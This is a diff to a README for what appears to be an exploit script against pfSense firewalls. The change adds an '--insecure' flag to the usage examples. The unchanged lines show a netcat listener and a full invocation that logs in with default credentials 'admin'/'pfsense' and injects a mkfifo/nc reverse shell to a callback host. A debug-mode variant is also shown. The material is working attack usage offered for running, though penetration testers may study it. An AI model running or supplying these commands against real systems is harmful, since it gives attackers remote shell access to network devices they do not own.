@@ -44,7 +44,7 @@ nc -lvnp 80
 Then, run the script with a reverse shell command like this:
 
 ```bash
-python3 exploit.py -u "admin" -p "pfsense" --mode "gif" -t "http://10.101.1.1" -c "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.151.1 80 > /tmp/f &"
+python3 exploit.py -u "admin" -p "pfsense" --mode "gif" -t "http://10.101.1.1" -c "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.151.1 80 > /tmp/f &"  --insecure(for https without valid ssl)
 ```
 
 ### Demo GIFs
@@ -97,7 +97,7 @@ Done with ❤️  by @bl4ckarch
 If you want to see more details about the requests being sent, you can enable debug mode by adding `-d` to your command. This will print out response data and help you troubleshoot any issues.
 
 ```bash
-python3 exploit.py -u "admin" -p 'pfsense' --mode 'gif' -t http://10.101.1.1 -c "your_command_here" -d
+python3 exploit.py -u "admin" -p 'pfsense' --mode 'gif' -t http://10.101.1.1 -c "your_command_here" -d --insecure(for https without valid ssl)
 ```
 
 ### Troubleshooting
